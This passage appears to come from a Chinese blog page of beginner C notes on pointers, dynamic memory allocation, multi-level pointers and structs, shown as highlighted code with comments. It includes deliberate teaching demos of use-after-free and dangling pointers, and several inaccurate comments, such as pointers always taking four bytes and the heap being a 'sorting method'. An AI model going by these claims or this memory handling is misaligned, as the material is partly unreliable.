class="comment">/*</span></span><br><span class="line"><span class="comment">指针：就是地址，地址就是指针</span></span><br><span class="line"><span class="comment">指针变量：存放地址的变量</span></span><br><span class="line"><span class="comment">两者不是一个概念</span></span><br><span class="line"><span class="comment">但是，通常在叙述中，会把指针变量简称为指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一级指针</span></span><br><span class="line">    <span class="comment">// 指针的本质： 存地址(内存单元的编号)，间接访问</span></span><br><span class="line">    <span class="comment">// 指针使用场景：</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &amp; 取地址操作符/【引用】</span></span><br><span class="line">    <span class="comment">// * 取值操作符/【解引用】</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">指针的重要性;</span></span><br><span class="line"><span class="comment">表示一些复杂的数据结构;</span></span><br><span class="line"><span class="comment">快速的传递数据</span></span><br><span class="line"><span class="comment">使函数返回一个以上的值</span></span><br><span class="line"><span class="comment">能直接访问硬件</span></span><br><span class="line"><span class="comment">能方便的处理字符串</span></span><br><span class="line"><span class="comment">是理解面向对象语言中引用的基础</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//地址：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">内存单元的编号</span></span><br><span class="line"><span class="comment">从零开始的非负整数</span></span><br><span class="line"><span class="comment">范围：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//指针：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">指针就是地址，地址就是指针</span></span><br><span class="line"><span class="comment">指针变量就是存放内存单元的变量，</span></span><br><span class="line"><span class="comment">两者不是一个概念</span></span><br><span class="line"><span class="comment">但是，通常在叙述中，会把指针变量简称为指针</span></span><br><span class="line"><span class="comment">指针的本质就是一个操作受限的非负整数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//指针的分类：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.基本类型的指针</span></span><br><span class="line"><span class="comment">int *p;</span></span><br><span class="line"><span class="comment">int i=10;</span></span><br><span class="line"><span class="comment">int j;</span></span><br><span class="line"><span class="comment">p = &amp;i;</span></span><br><span class="line"><span class="comment">i=*p;</span></span><br><span class="line"><span class="comment">printf("%d",j);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">例子，见函数base_pointer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base_pointer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line"><span class="keyword">int</span> *q;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*p = i; //【错误】，*p代表的是p指向的地址的变量的值，p现在指向的垃圾值(还没有初始化)</span></span><br><span class="line"><span class="comment">//应该这样</span></span><br><span class="line">p = &amp;i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*q=p;  //【错误】，有语法错误，*q是整形，p是int*类型</span></span><br><span class="line"><span class="comment">//*q =  *p; //【错误】,语法没错，但是q指向垃圾值（没初始化）</span></span><br><span class="line"><span class="comment">//应该这样：</span></span><br><span class="line"><span class="comment">//p=q;  // 【错误】，q赋给p，p也变成垃圾值</span></span><br><span class="line"><span class="comment">//printf("%d\n", *p);  // q的空间是属于本程序的，所以本程序可以读写q的内容，但是如果q的内部是垃圾值，则本程序不能读写*p的内容,因为*q所代表的的内存单元的控制权限并没有分配给本程序</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针变量的运算：</span></span><br><span class="line"><span class="comment">// 指针变量不能相加、相乘、相除（能相减：如果两个指针变量指向的是【同一块连续空间中的不同存储单元】）</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">p = &amp;a[1];</span></span><br><span class="line"><span class="comment">q = &amp;a[3];</span></span><br><span class="line"><span class="comment">printf("%d", q-p);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//指针的偏移</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[N]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    p = &amp;a[<span class="number">4</span>];  <span class="comment">// 指向a最后一个元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++)     <span class="comment">// 指针偏移</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%3d"</span>, *(p-i));     <span class="comment">// p +sizeof(int)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指针与自增</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;<span class="number">2</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line">    p = a;</span><br><span class="line">    j = *p++;     <span class="comment">// j = *p; p=p+1。     </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a[0]=%d, j=%d, *p=%d \n"</span>, a[<span class="number">0</span>], j, *p);  <span class="comment">// 2,2,7</span></span><br><span class="line"></span><br><span class="line">    j = p[<span class="number">0</span>]++; <span class="comment">// j=p[0],  p[0] = p[0] +1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a[0]=%d, j=%d, *p=%d \n"</span>, a[<span class="number">0</span>], j, *p);  <span class="comment">// 2,7,8  ？？？  </span></span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//野指针: free以后的指针未被赋值为NULL  (指向了一个未知的空间)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *p, *p1, *p2, *p3;</span><br><span class="line">    p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">    p = <span class="literal">NULL</span>;   <span class="comment">// 赋值null以后，后面用的话会崩溃，能迅速找到问题</span></span><br><span class="line"></span><br><span class="line">    p1 = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);  </span><br><span class="line">    *p1 = <span class="number">2</span>;  <span class="comment">// 没有free</span></span><br><span class="line"></span><br><span class="line">    p2 = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p2 = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">    p3 = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *p3 = <span class="number">3</span>;</span><br><span class="line">    *p1 = <span class="number">20</span>; <span class="comment">// 以为p1free了，这里又赋值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p3 = %d"</span>, *p3);   <span class="comment">//  20了    malloc有缓存机制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 经典程序：互换两个数字</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchange_two</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line"><span class="comment">//int t;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//之前的做法</span></span><br><span class="line"><span class="comment">//t=a;</span></span><br><span class="line"><span class="comment">//a=b;</span></span><br><span class="line"><span class="comment">//b=t;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在要求调用一个函数实现</span></span><br><span class="line">test_exchange3(&amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a=%d,b=%d"</span>,a,b);</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能完成互换功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"></span><br><span class="line">t=a;</span><br><span class="line">a=b;</span><br><span class="line">b=t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能完成互换功能，只是把q和p的值换了，a和b并没有互换</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange2</span><span class="params">(<span class="keyword">int</span> *p, <span class="keyword">int</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *t; <span class="comment">// 如果要互换，变量类型必须一致</span></span><br><span class="line">t = p; </span><br><span class="line">p = q;</span><br><span class="line">q = t;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 形参的改变，不会改变实参的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以完成互换: p是a的地址，*p就是a</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange3</span><span class="params">(<span class="keyword">int</span> *p, <span class="keyword">int</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t; <span class="comment">// 如果要互换，变量类型必须一致</span></span><br><span class="line">t = *p;  <span class="comment">// *p是int，p是int* </span></span><br><span class="line">*p = *q;</span><br><span class="line">*q = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// *的含义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.乘法</span></span><br><span class="line"><span class="comment">//2.定义指针变量 </span></span><br><span class="line"><span class="keyword">int</span> *p;  <span class="comment">//定义了一个叫p的变，int *表示p只能存放地址</span></span><br><span class="line"><span class="comment">//3.指针运算符：取地址的逆运算/间接访问</span></span><br><span class="line"><span class="comment">// 放在已经定义好的指针变量的前面，取改指针的值</span></span><br><span class="line"><span class="comment">//*p 表示以p的内容为地址的变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//写法：下面三种是等价的</span></span><br><span class="line"><span class="comment">//int * p;</span></span><br><span class="line"><span class="comment">//int *p;</span></span><br><span class="line"><span class="comment">//int* p;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">脏数据</span></span><br><span class="line"><span class="comment">申请的空间不释放：内存泄露</span></span><br><span class="line"><span class="comment">堆空间：一旦申请，一直占用，除非free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">    p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(i);</span><br><span class="line">    <span class="built_in">strcpy</span>(p, <span class="string">"hello"</span>);   <span class="comment">// p指向堆空间</span></span><br><span class="line">    <span class="comment">// p = "hellp";</span></span><br><span class="line">    <span class="built_in">puts</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(p);  <span class="comment">// 释放</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free p ~~~~~~~~~~~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 一个指针变量到底占几个字节？</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">指向不同类型，是不同的，比如int 一般是4个字节, char就是1个。     sizeof()可以查看：sizeof(double)</span></span><br><span class="line"><span class="comment">p,q,r所占的字节数是一样的</span></span><br><span class="line"><span class="comment">【总结：】一个指针变量，无论他指向的变量占几个字节，该指针变量只占四个字节。</span></span><br><span class="line"><span class="comment">一个变量的地址使用该变量首字节的地址来表示</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存分配（重点）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.传统数组的缺点</span></span><br><span class="line"><span class="comment">a.数组长度必须事先制定，且只能是长整数，不能是变量（int len=5; int a[len]; 这样是错误的）</span></span><br><span class="line"><span class="comment">b.传统形式定义的数组，该数组的内存，程序员无法手动释放（一旦定义，该分配空间一直存在，直到数组所在的函数运行结束，数组的空间才会被系统释放）</span></span><br><span class="line"><span class="comment">c.数组的长度不能再函数运行过程中动态扩充或缩小(长度一旦定义，其长度就不能再更改)</span></span><br><span class="line"><span class="comment">d.A函数定义的数组，在A函数运行期间可以被其他函数使用；但A函数执行完毕后，A函数中的数组将无法再被其他函数使用</span></span><br><span class="line"><span class="comment">传统数组也叫静态数组</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.为什么需要动态分配内存</span></span><br><span class="line"><span class="comment">解决了传统数组的4个缺陷</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.动态内存分配举例_  动态数组的构造</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4.静态内存和动态内存的比较</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5.跨函数使用内存的问题</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// malloc 是memory(内存) allocate(分配)的缩写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(i);  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1.要使用malloc，必须添加malloc.h或stdlib.h头文件</span></span><br><span class="line"><span class="comment">2.malloc只有一个形参，且形参必须是整数类型</span></span><br><span class="line"><span class="comment">3.上面，表示请求系统为本程序分配5个字节</span></span><br><span class="line"><span class="comment">4.malloc函数只能返回第一个字节的地址，所以前面要把地址强制转换为int*</span></span><br><span class="line"><span class="comment">5.p本身的内存是静态分配的，p所指向的内存是动态分配的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(p, <span class="string">"hello"</span>);   <span class="comment">// p指向堆空间</span></span><br><span class="line">    <span class="comment">// p = h e l l o \o;</span></span><br><span class="line">    <span class="built_in">puts</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(p);  <span class="comment">// 释放p所指向的内存 （p本身的内存是静态的，不能由程序员手动释放）</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free p ~~~~~~~~~~~"</span>);</span><br><span class="line"><span class="comment">// 脏数据</span></span><br><span class="line"><span class="comment">// 申请的空间不释放：内存泄露</span></span><br><span class="line"><span class="comment">// 堆空间：一旦申请，一直占用，除非free</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// *p = 200; // error</span></span><br><span class="line"><span class="comment">// q = 20   //error</span></span><br><span class="line"><span class="comment">// q是p的一份拷贝(副本)</span></span><br><span class="line"><span class="comment">// **q=200  // error</span></span><br><span class="line">*q=<span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//int *arr = (int*)malloc(20);</span></span><br><span class="line"> <span class="comment">//   int *p;</span></span><br><span class="line"> <span class="comment">//   arr[0] = 1;</span></span><br><span class="line"> <span class="comment">//   arr[1] = 1;</span></span><br><span class="line"> <span class="comment">//   arr[2] = 1;</span></span><br><span class="line"> <span class="comment">//   arr[3] = 1;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//   p = (int*)realloc(arr, 40);    // 扩展</span></span><br><span class="line"> <span class="comment">//   p[4] = 6;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">*p = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *p); <span class="comment">//10</span></span><br><span class="line">f(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *p); <span class="comment">//200</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存分配举例 动态一维数组的构造</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">int</span> *pArr;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输出要存放元素的个数："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;len); <span class="comment">// 5</span></span><br><span class="line">pArr = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span>*len);  <span class="comment">// 数组长度为len； 5*4=20,（默认pArr指向第一个字节，但是由于进行了int强转，所以pArr指向前四个字节,pArr指向后面4个字节）</span></span><br><span class="line"><span class="comment">//类似于 int pArr[len];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;pArr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"一维数组的内容是: \n"</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, "</span>, pArr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">realloc</span>(pArr, <span class="number">40</span>);    <span class="comment">// 扩展</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//释放数组</span></span><br><span class="line"><span class="built_in">free</span>(pArr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存和静态内存的比较</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">静态内存是由系统自动分配，由系统自动释放，是在栈分配的</span></span><br><span class="line"><span class="comment">动态内存是由程序员手动分配，手动释放，是由堆分配的</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc是堆分配的</span></span><br><span class="line"><span class="comment">栈是存储结构，堆是排序方式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multi_test</span><span class="params">(<span class="keyword">int</span> **pp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">300</span>;</span><br><span class="line"><span class="comment">//  pp是p的地址，那*pp 就是p</span></span><br><span class="line">*pp = &amp;j;   <span class="comment">// 修改</span></span><br><span class="line">**pp = <span class="number">200</span>; <span class="comment">// 修改</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多级指针（意义：跨函数使用内存）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">two_pointer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 【场景】：当在子函数中需要修改主函数某一个一级指针变量的值，就需要二级指针</span></span><br><span class="line">    <span class="comment">//char b[N][10] = &#123;"lilei","hanmeimei","xiyangyang","huitailang", "xiongda"&#125;;</span></span><br><span class="line">    <span class="comment">//char * p[N];  // 指针数组，里面存储的指针类型就是 二级指针   // &amp;p[0]        每次偏移是固定的，64位数下就是8个字节</span></span><br><span class="line">    <span class="comment">//// char **p2;</span></span><br><span class="line">    <span class="comment">//int i;</span></span><br><span class="line">    <span class="comment">//for(i=0; i&lt;N; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    p[i] = b[i];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//for(i=0; i&lt;N; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    puts(p[i]);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> *p = &amp;i;</span><br><span class="line"><span class="keyword">int</span> **q = &amp;p;</span><br><span class="line"><span class="keyword">int</span> ***r = &amp;q;</span><br><span class="line"></span><br><span class="line"><span class="comment">//r = &amp;p;   // 错误，因为r是int**类型，r只能存放int**类型变量的地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,***r); <span class="comment">// r的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在另一个函数内部改变变量值</span></span><br><span class="line">multi_test(&amp;p);  <span class="comment">// p是int *, 那么 &amp;p是int**</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f1</span><span class="params">(<span class="keyword">int</span> **q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">5</span>;</span><br><span class="line"><span class="comment">//*q等价于p，q和**q都不等价于p</span></span><br><span class="line"><span class="comment">// *q=i // error</span></span><br><span class="line">*q = &amp;i;  <span class="comment">// p=&amp;i</span></span><br><span class="line"><span class="comment">//**q=i;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态变量不能跨函数使用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line"></span><br><span class="line">f1(&amp;p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, *p);  <span class="comment">// 本语句语法没有问题，但逻辑上有问题（因为f函数中i的静态分配的，f结束，i的空间就释放了）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f2</span><span class="params">(<span class="keyword">int</span> **q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*q = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="comment">// 等价于p = (int *)malloc(sizeof(int));</span></span><br><span class="line"><span class="comment">//q=5;  // error</span></span><br><span class="line"><span class="comment">//*q=5; // p=5   error</span></span><br><span class="line">**q=<span class="number">5</span>; <span class="comment">// *p=5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态内存可以跨函数使用（重点）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">f2(&amp;p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, *p); <span class="comment">// 能改变。p指向的是上面堆里面分配的空间</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><p>jiegouti.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">struc_func</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputStudent</span><span class="params">(struct Student *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent</span><span class="params">(struct Student)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent2</span><span class="params">(struct Student *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_union</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 